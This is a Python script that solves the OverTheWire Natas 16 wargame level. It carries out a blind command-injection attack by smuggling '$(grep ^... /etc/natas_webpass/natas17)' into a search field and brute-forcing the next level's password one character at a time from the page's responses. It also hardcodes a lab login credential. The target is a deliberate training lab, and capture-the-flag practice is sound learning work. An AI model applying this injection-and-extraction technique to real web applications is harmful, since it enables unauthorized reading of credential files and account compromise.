#!/usr/bin/env python3

import requests
import re
from string import *

characters = ascii_lowercase + ascii_uppercase + digits

username = 'natas16'
password = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()

# response = requests.get(url, auth = (username, password))
seen_password = list()
while(len(seen_password) < 32):
	for character in characters:
		print("".join(seen_password) + character)
		response = requests.post(url, data = { "needle": "anythings$(grep ^" + "".join(seen_password) + character + " /etc/natas_webpass/natas17)" }, auth = (username, password))
		content = response.text

		returned = re.findall('<pre>\n(.*)\n</pre>', content)

		if(not returned):
			seen_password.append(character)
			break

# print(re.findall('natas15 is (.*)<br>', content)[0])